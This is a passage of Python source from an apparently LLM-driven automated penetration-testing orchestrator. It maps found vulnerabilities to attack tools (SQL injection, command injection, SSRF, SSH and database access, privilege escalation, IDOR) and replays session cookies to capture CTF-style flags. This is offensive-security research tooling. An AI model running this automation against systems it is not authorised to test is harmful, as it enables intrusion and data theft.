                       and _resolve_tools((v.get("vuln_type") or "").lower())]
        unmapped_vulns = [v for v in vulns if v not in llm_vulns and v not in other_mapped]
        vulns_sorted = llm_vulns + other_mapped + unmapped_vulns

        # Summarize
        vuln_type_counts: dict[str, int] = {}
        for v in vulns:
            vt = (v.get("vuln_type") or "").lower()
            display = vt if vt else "(untyped)"
            vuln_type_counts[display] = vuln_type_counts.get(display, 0) + 1
        mapped_counts = {
            vt: c for vt, c in vuln_type_counts.items()
            if vt == "(untyped)" or _resolve_tools(vt)
        }
        unmapped_counts = {
            vt: c for vt, c in vuln_type_counts.items()
            if vt != "(untyped)" and not _resolve_tools(vt)
        }
        print(f"[systematic] {len(vulns)} vulns: {len(llm_vulns) + len(other_mapped)} mapped ({len(llm_vulns)} LLM-suggested), {len(unmapped_vulns)} unmapped")
        print(f"[systematic]   mapped types: {mapped_counts}")
        print(f"[systematic]   unmapped types: {unmapped_counts}")
        _untyped_with_endpoint = sum(
            1 for v in vulns
            if not (v.get("vuln_type") or "").strip()
            and (v.get("endpoint") or v.get("url"))
        )
        if _untyped_with_endpoint:
            print(
                f"[systematic]   {_untyped_with_endpoint} untyped vuln(s) with endpoint "
                "-> attempted with fallback HTTP tools",
                flush=True,
            )
        if session_cookies:
            print(f"[systematic]   session cookies: {session_cookies[:80]}...")

        if not hasattr(self, '_tried_systematic'):
            self._tried_systematic: set[tuple] = set()
        tried = self._tried_systematic  # (tool, url, param) dedup, cross-cycle
        tested_count = 0
        MAX_TESTS = 20
        # Runtime capability snapshot: tools whose binary is missing on this
        # host can only fail with exit=127, so they are dropped from the
        # automatic pass (the registry and manifest stay complete).
        _specs_by_name: dict = {}
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                _specs_by_name.update(_gw.get_tool_specs())
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)

        def _tool_runnable(tool_name: str) -> bool:
            if tool_name in self._BLACKLISTED_TOOLS:
                return False
            spec = _specs_by_name.get(tool_name)
            return True if spec is None else _spec_is_available(spec)

        # HTTP endpoints only accept tools whose contract speaks HTTP. This is
        # derived from the ToolSpec parameter names (not a hardcoded tool list),
        # so DB/SSH/cloud CLI tools are never even attempted against a URL.
        _HTTP_SPEC_PARAMS = {"url", "target_url", "ssrf_url"}

        def _tool_http_viable(tool_name: str) -> bool:
            spec = _specs_by_name.get(tool_name)
            if spec is None:
                return True
            return bool(_HTTP_SPEC_PARAMS & set((spec.parameters or {}).keys()))

        for v in vulns_sorted:
            if tested_count >= MAX_TESTS:
                break
            vt = (v.get("vuln_type") or "").lower()
            endpoint = v.get("endpoint", "") or v.get("url", "")
            param = v.get("parameter", "") or v.get("param", "")
            source = v.get("source", "")

            if not endpoint:
                continue
            # Skip infrastructure ports
            if any(s.get("skip_exploit") for s in self.dkg.query_nodes("Service")
                   if s.get("port") and f":{s['port']}" in endpoint):
                continue

            tools = _resolve_tools(vt)
            tools = [name for name in tools if _tool_runnable(name)]
            if endpoint.startswith(("http://", "https://")):
                tools = [name for name in tools if _tool_http_viable(name)]

            # ── Privilege escalation: use dedicated exploitation method ──
            # rather than running generic shell_exec + linux_priv_check
            if vt == "privilege_escalation":
                log.info("[systematic] Running _execute_privesc for %s", endpoint)
                privesc_flag = await self._execute_privesc(endpoint)
                if privesc_flag:
                    self.phase = OrchestratorPhase.DONE
                    result = TaskResult(
                        success=True, flag=privesc_flag, steps=self.step_count,
                        tokens_used=self._tokens_used(),
                        time_elapsed=time.time() - self.start_time,
                    )
                    self._verified_flag_result = result
                    return result
                tested_count += 1
                continue

            # Always check protocol detection first — this handles services
            # that use HTTP-like URIs but aren't web servers (etcd, K8S API,
            # kubelet). Protocol detection is driven by DKG Service node names,
            # which come from nmap fingerprints / openssl CN probes, so it
            # works regardless of port number.
            # When detection succeeds, use protocol-specific tools INSTEAD of
            # the generic VULN_TOOL_MAP list (not intersected — the protocol
            # detection is more specific and authoritative).
            detected = _detect_proto_from_service(endpoint, self.dkg)
            if detected is not None:
                tools = sorted(detected)
            elif not endpoint.startswith("http://") and not endpoint.startswith("https://"):
                # Map endpoint proto to matching tools
                _ALL_PROTOCOL_TOOLS = {"redis_cmd", "ssh_exec", "ssh_key_exec",
                                       "mysql_query", "psql_query", "mssql_query",
                                       "oracle_query", "test_credential", "shell_exec"}
                _PROTO_TOOLS = {
                    "redis://": {"redis_cmd", "shell_exec"},
                    "ssh://": {"ssh_exec", "ssh_key_exec", "test_credential"},
                    "mysql://": {"mysql_query", "shell_exec"},
                    "postgresql://": {"psql_query", "shell_exec"},
                    "mssql://": {"mssql_query", "mssqlclient_query", "shell_exec"},
                    "oracle://": {"oracle_query", "shell_exec"},
                    "mongodb://": {"shell_exec"},
                    "memcached://": {"shell_exec"},
                }
                # Find matching proto-specific tools, fall back to port-based detection
                matched = None
                for proto_prefix, proto_tools in _PROTO_TOOLS.items():
                    if endpoint.startswith(proto_prefix):
                        matched = proto_tools
                        break
                if matched is not None:
                    tools = [t for t in tools if t in matched]
                else:
                    # Unknown protocol (not in the 8 known service types).
                    # Strip ALL protocol-specific tools — only keep generic
                    # shell_exec which can run arbitrary commands. Prevents
                    # mysql_query on Kerberos, redis_cmd on LDAP, etc.
                    tools = [t for t in tools if t == "shell_exec"]
                if not tools:
                    continue
            else:
                # HTTP endpoint — exclude tools that only work over non-HTTP protocols.
                # mysql_query, ssh_exec, redis_cmd, etc. cannot operate on HTTP endpoints
                # and running them wastes systematic pass slots.
                _NON_HTTP_PROTOCOL_TOOLS = {
                    "ssh_exec", "ssh_key_exec", "mysql_query", "psql_query",
                    "mssql_query", "oracle_query", "redis_cmd", "shell_exec",
                }
                tools = [t for t in tools if t not in _NON_HTTP_PROTOCOL_TOOLS]

            # Inject LLM-suggested tool from vulnerability analysis if present.
            # The LLM may have correctly identified a tool that VULN_TOOL_MAP
            # doesn't know about (e.g. etcdctl_get for etcd AuthBypass).
            llm_tool = v.get("suggested_tool", "") or ""
            llm_args = v.get("tool_args", {}) or {}
            if not isinstance(llm_args, dict):
                llm_args = {}
            # Filter blacklisted tools — brute-force tools (hydra_ssh_brute,
            # hydra_http_brute) waste time and should never reach execution,
            # even when the LLM explicitly suggests them.
            if llm_tool in self._BLACKLISTED_TOOLS:
                replacement = self._BLACKLISTED_TOOLS[llm_tool]
                if replacement:
                    llm_tool = replacement
                else:
                    llm_tool = ""  # Tool unavailable — drop it
            if llm_tool and llm_tool not in tools:
                tools = [llm_tool] + list(tools)
            if not tools:
                # No hardcoded mapping — use LLM suggestion as primary
                if llm_tool:
                    tools = [llm_tool]

            # If still no tool, fall back to curl_get as generic probe
            if not tools:
                tools = ["curl_get"]

            for tool_name in tools:
                if tested_count >= MAX_TESTS:
                    break
                # Build args: start with defaults, merge LLM-suggested overrides
                args: dict = {}
                if tool_name == "sqlmap_test":
                    args = {"url": endpoint, "param": param or "id"}
                elif tool_name == "xss_reflection_test":
                    args = {"url": endpoint, "param": param or "q"}
                elif tool_name == "command_injection_test":
                    args = {"url": endpoint, "param": param or "cmd"}
                elif tool_name == "curl_get":
                    u = endpoint or target_url
                    if session_cookies:
                        args = {"url": u, "headers": f"Cookie: {session_cookies}"}
                    else:
                        args = {"url": u}
                elif tool_name == "send_payload":
                    args = {"url": endpoint, "payload": "1", "param": param or "id"}
                elif tool_name == "ssrf_probe":
                    # Feed discovered HTTP ports into the SSRF probe so
                    # non-standard benchmark services are not missed.
                    _ports = sorted({
                        int(s.get("port")) for s in self.dkg.query_nodes("Service")
                        if s.get("port") and str(s.get("service_name", "")).lower() in {
                            "http", "https", "http-proxy", "werkzeug", "unknown"
                        }
                    })
                    args = {
                        "ssrf_url": endpoint,
                        "url_param": param or "url",
                        "ports": ",".join(str(p) for p in _ports) if _ports else "80,443,8080,5000,3000,8000",
                    }
                elif tool_name == "aws_cli":
                    # aws_cli uses service+action+resource, not url+param.
                    # Use the vuln's tool_args directly; fall back to s3 ls.
                    _va = {}
                    for v in vulns:
                        if v.get("suggested_tool") == "aws_cli" and v.get("tool_args"):
                            _va = v["tool_args"]
                            break
                    if _va:
                        args = dict(_va)
                    else:
                        args = {"service": "s3", "action": "ls",
                                "resource": "", "payload_json": ""}
                else:
                    # Parse DB/non-HTTP endpoints into host/port args
                    if "://" in endpoint and not endpoint.startswith("http"):
                        from urllib.parse import urlparse as _up
                        _parsed = _up(endpoint)
                        args = {"host": _parsed.hostname or "localhost"}
                        if _parsed.port:
                            args["port"] = _parsed.port
                    else:
                        args = {"url": endpoint, "param": param} if param else {"url": endpoint}
                # Merge LLM-suggested args (method, body_format, etc.) as overrides
                if tool_name == llm_tool and llm_args:
                    # Remove 'url' if LLM args provide host-based params (DB tools)
                    _has_host = any(k in llm_args for k in ("host", "user", "query"))
                    if _has_host:
                        args.pop("url", None)
                    args.update(llm_args)
                # If endpoint is POST-only, ensure exploit tools use POST
                if tool_name in ("sqlmap_test", "send_payload", "command_injection_test",
                                 "xss_reflection_test"):
                    ep_nodes = [e for e in self.dkg.query_nodes("Endpoint")
                               if e.get("url", "") == endpoint]
                    ep_method = ep_nodes[0].get("method", "GET") if ep_nodes else "GET"
                    if ep_method == "POST" and args.get("method", "GET") == "GET":
                        args["method"] = "POST"
                        args["body_format"] = args.get("body_format", "json")
                        log.info("Systematic: endpoint %s is POST — using method=POST body_format=json", endpoint)

                # Always add session cookies if available
                if session_cookies and "headers" not in args:
                    args["headers"] = f"Cookie: {session_cookies}"

                # ── Schema-based tool compatibility check ─────────
                # Verify that the args we constructed for this endpoint
                # have at least one key matching the tool's declared
                # parameters.  If zero overlap, try generic parameter
                # name remapping before skipping.
                _tool_entry = (
                    self.attack_gateway._registry.get(tool_name)
                    or self.recon_gateway._registry.get(tool_name)
                )
                if _tool_entry is not None:
                    _tool_params = set(_tool_entry.parameters.keys())
                    _arg_keys = set(args.keys())
                    if _tool_params and not (_tool_params & _arg_keys):
                        # ── Generic parameter name remapping ──
                        # Vulnerabilities store param names like 'url'/'param'/'endpoint',
                        # but tools may expect 'ssrf_url'/'url_param'/'target_url'.
                        # Remap based on common aliases — no hardcoded tool names.
                        _REMAP_TABLE: dict[str, list[str]] = {
                            "url":         ["ssrf_url", "target_url", "url"],
                            "endpoint":    ["url", "ssrf_url", "target_url"],
                            "param":       ["url_param", "param_name"],
                            "target_url":  ["url", "ssrf_url"],
                            "host":        ["target", "host"],
                        }
                        _remapped: dict[str, object] = {}
                        for _arg_key, _arg_val in args.items():
                            if _arg_key in _REMAP_TABLE:
                                for _candidate in _REMAP_TABLE[_arg_key]:
                                    if _candidate in _tool_params and _candidate not in _remapped:
                                        _remapped[_candidate] = _arg_val
                                        break
                        if _remapped:
                            args.update(_remapped)
                            _arg_keys = set(args.keys())

                    if _tool_params and not (_tool_params & _arg_keys):
                        print(
                            f"[systematic] skip {tool_name}: schema mismatch "
                            f"(tool expects {sorted(_tool_params)}, "
                            f"got {sorted(_arg_keys)})"
                        )
                        continue

                # Only count as tried once the schema check passes — prevents
                # vulns without LLM args from poisoning the dedup cache for
                # vulns that DO have correct args (e.g. XSS vuln processed
                # before AuthBypass vuln, both on same etcd endpoint).
                # The key includes an args fingerprint so a later cycle that
                # constructs a genuinely different call on the same
                # (tool, endpoint, param) is not silently skipped.
                dedup_key = (tool_name, endpoint, param, _args_fingerprint(args))
                if dedup_key in tried:
                    continue
                tried.add(dedup_key)
                tested_count += 1

                try:
                    cookie_note = " [with auth]" if session_cookies else ""
                    source_note = ""
                    if tool_name == llm_tool and llm_args:
                        source_note = " [LLM-suggested]"
                    elif not _resolve_tools(vt) and tool_name == "curl_get":
                        source_note = " [generic fallback]"
                    print(f"[systematic] {tool_name} on {endpoint} param={param}{cookie_note}{source_note} (type={vt})")
                    if tool_name in self.attack_gateway.get_tool_names():
                        result = await self._call_tool(tool_name, args)
                        stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    elif tool_name in self.recon_gateway.get_tool_names():
                        result = await self._call_tool(tool_name, args)
                        stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    else:
                        continue

                    # Show truncated result
                    print(f"  → {stdout[:250].strip().replace(chr(10), ' ')}")

                    self.step_count += 1
                    self._task_log_event("info", "systematic_exploit",
                        tool=tool_name, url=endpoint, vt=vt,
                        result=stdout[:300])

                    # Update DKG Vulnerability node with test result
                    dkg_nid = v.get("id", "")
                    if dkg_nid:
                        self.dkg.add_node("Vulnerability", dkg_nid, {
                            "tested_at": time.strftime("%H:%M:%S"),
                            "test_result": stdout[:200],
                            "test_tool": tool_name,
                        })

                    # DAVE L4: check for flag
                    flags = self.flag_pattern.findall(stdout)
                    for f in flags:
                        is_valid, reason = await self._verify_flag(
                            f, stdout, args, tool_name=tool_name)
                        if is_valid:
                            self._task_log_event("info", "flag_found_systematic",
                                tool=tool_name, flag=f)
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self._tokens_used(),
                                time_elapsed=time.time() - self.start_time,
                            )
                        else:
                            log.warning("DAVE rejected flag: %s", reason)

                except Exception as e:
                    print(f"[systematic] {tool_name} FAILED: {e}")
                    continue

        # ── IDOR Header Test (systematic, before auth crawl) ─────
        # If we have session cookies, test for IDOR via custom headers
        # immediately — this catches the most common CTF/benchmark pattern.
        if session_cookies:
            for port in getattr(self, '_discovered_http_ports', []):
                host = getattr(self, "target_host", None) or "localhost"
                scheme = "https" if port == 443 else "http"
                base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
                try:
                    idor_result = await self._call_tool("idor_header_test", {
                        "url": f"{base}/dashboard",
                        "cookie": session_cookies,
                    })
                    if idor_result.success and idor_result.parsed_output:
                        f = idor_result.parsed_output.get("flag")
                        if f:
                            print(f"[systematic] IDOR HEADER FLAG: {f}")
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self._tokens_used(),
                                time_elapsed=time.time() - self.start_time,
                            )
                except Exception as exc:
                    log.debug("swallowed exception: %s", exc, exc_info=True)

        # ── Authenticated endpoint crawl ──────────────────────────
        # If we have session cookies, fetch ALL discovered endpoints with auth.
        # This catches flags hidden behind authentication (most common pattern).
        if session_cookies:
            endpoints = self.dkg.query_nodes("Endpoint")
            auth_tested = 0
            for ep in endpoints:
                ep_url = ep.get("url", "") or ep.get("id", "")
                if not ep_url or "://" not in ep_url:
                    continue
                dedup_key = ("curl_get_auth", ep_url, "")
                if dedup_key in tried:
                    continue
                tried.add(dedup_key)
                auth_tested += 1
                try:
                    print(f"[systematic] curl_get AUTH on {ep_url} [with session]")
                    result = await self._call_tool("curl_get", {
                        "url": ep_url,
                        "headers": f"Cookie: {session_cookies}",
                    })
                    stdout = result.stdout if hasattr(result, 'stdout') else str(result)
                    print(f"  → {stdout[:200].strip().replace(chr(10), ' ')}")
                    # Check for flag
                    flags = self.flag_pattern.findall(stdout)
                    for f in flags:
                        is_valid, reason = await self._verify_flag(
                            f, stdout, {"url": ep_url, "headers": f"Cookie: {session_cookies}"},
                            tool_name="curl_get")
                        if is_valid:
                            self._task_log_event("info", "flag_found_auth_crawl",
                                url=ep_url, flag=f)
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=f, steps=self.step_count,
                                tokens_used=self._tokens_used(),
                                time_elapsed=time.time() - self.start_time,
                            )
                except Exception as e:
                    print(f"[systematic] auth curl {ep_url} FAILED: {e}")

            if auth_tested > 0:
                print(f"[systematic] Auth crawl: tested {auth_tested} endpoints with session")

        print(f"[systematic] Done: tested {tested_count} tool+endpoint combinations, no flag found")
        return None
